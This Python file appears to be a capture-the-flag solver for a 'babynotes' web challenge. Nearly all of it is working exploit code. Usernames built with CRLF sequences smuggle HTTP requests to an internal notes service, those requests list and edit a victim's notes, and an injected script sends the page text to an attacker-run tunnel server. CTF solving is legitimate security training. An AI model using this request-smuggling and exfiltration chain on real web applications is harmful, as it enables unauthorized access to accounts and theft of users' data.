import json
import os
import re
import secrets
import threading
import time
from typing import Optional
from urllib.parse import urlparse, unquote

import requests
import tunnel

URL = os.environ.get("URL", "https://babynotes.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]


class Challenge:
    csrf: str
    username: str

    def __init__(self, url: str) -> None:
        self.url = url
        self.sess = requests.Session()

    def register(self, username: str):
        res = self.sess.get(self.url + '/register.php')
        res.raise_for_status()

        self.csrf = res.cookies['csrf']

        res = self.sess.post(self.url + '/register.php', data={
            'username': username,
            'csrf': self.csrf
        })
        res.raise_for_status()

        self.username = username

    def edit(self, id: str, title: str, body: str):
        res = self.sess.post(self.url + '/edit.php?id=' + id, data={
            'title': title,
            'body': body,
            'csrf': self.csrf
        })
        res.raise_for_status()

    def view(self, id: str):
        res = self.sess.get(self.url + '/view.php?id=' + id)
        res.raise_for_status()

        return res.text

    def support(self, url: str):
        res = self.sess.post(self.url + '/support.php',
                             data={'url': url, 'csrf': self.csrf, 'pow': 'redacted'})
        res.raise_for_status()

        m = re.search(r'our agent (\w+) is taking care', res.text)
        assert m is not None

        return m[1]


class Server:
    target_user: Optional[str]
    leak: Optional[str]

    def __init__(self, chall: Challenge):
        self.leak = None
        self.target_user = None
        self.chall = chall
        self.t = tunnel.open_http_tunnel(tls=True)

    def __enter__(self):
        self.t.__enter__()
        threading.Thread(target=self.run).start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.t.__exit__(exc_type, exc_val, exc_tb)

    def url(self):
        return f'https://{self.t.remote_host}:{self.t.remote_port}'

    def run(self):
        while True:
            req = self.t.wait_request()
            if req is None:
                break

            _, path, headers, body = req
            res = urlparse(path)
            path, query = res.path, res.query

            if path == '/':
                self.t.send_response(200, {'Content-Type': 'text/html'}, """
                    <script>
                        window.open('/x')
                        window.history.back()
                    </script>
                """.encode())
            elif path == '/x':
                assert self.target_user is not None

                self.chall.edit(self.target_user, 'foo', 'bar')

                notes = smuggled_list(self.target_user, self.chall.username, self.chall.sess.cookies.get('session'))
                assert len(notes) > 0

                smuggled_edit(notes[0], self.chall.username, self.chall.sess.cookies.get('session'), f'''
                    <script>
                        location = "{self.url()}/leak?data=" + encodeURIComponent(opener.document.body.innerText);
                    </script>
                ''', 'GET SMUGGLED BOI')

                self.t.send_response(200, {'Content-Type': 'text/html'}, f'''
                    <script>
                        location = '{URL}/view.php?id={notes[0]}';
                    </script>
                '''.encode())
            elif path == '/leak':
                self.leak = query
                self.t.send_response(200, {}, b'')
            else:
                self.t.send_response(404, {}, b'')


def smuggled_list(note_id: str, username: str, token: str):
    payload = '''{buster}
Host: notes
Connection: keep-alive
Authentication: {username} {token}


GET /view/{id} HTTP/1.1
Host: notesa
foo: bar
Authentication: {username} {token}
foo: bar
'''.format(id=note_id, buster=secrets.token_urlsafe(6), token=token, username=username).replace('\n', '\r\n')

    chall = Challenge(URL)
    chall.register(payload)
    resp = chall.view('1')
    json_str = re.findall(r'({&quot;note.*)', resp, re.MULTILINE)[0].replace('&quot;', '"')
    return json.loads(json_str)['note']['notes']


def smuggled_edit(note_id: str, username: str, token: str, body: str, title: str):
    json_data = json.dumps({'title': title, 'body': body})
    payload = '''{buster}
Host: notes
Connection: keep-alive
Authentication: {username} {token}


POST /edit/{id} HTTP/1.1
Host: notesa
foo: bar
Authentication: {username} {token}
Content-Type: application/json
Content-Length: {body_length}
foo: bar

{json_data}
'''.format(id=note_id, username=username, token=token, buster=secrets.token_urlsafe(8), body_length=len(json_data),
           json_data=json_data).replace('\n', '\r\n')

    chall = Challenge(URL)
    chall.register(payload)
    chall.view('1')


def main():
    chall = Challenge(URL)
    chall.register(secrets.token_urlsafe(8))

    with Server(chall) as srv:
        srv.target_user = chall.support(srv.url())

        while True:
            if srv.leak is not None:
                print(unquote(srv.leak))
                break

            time.sleep(1)


if __name__ == '__main__':
    main()
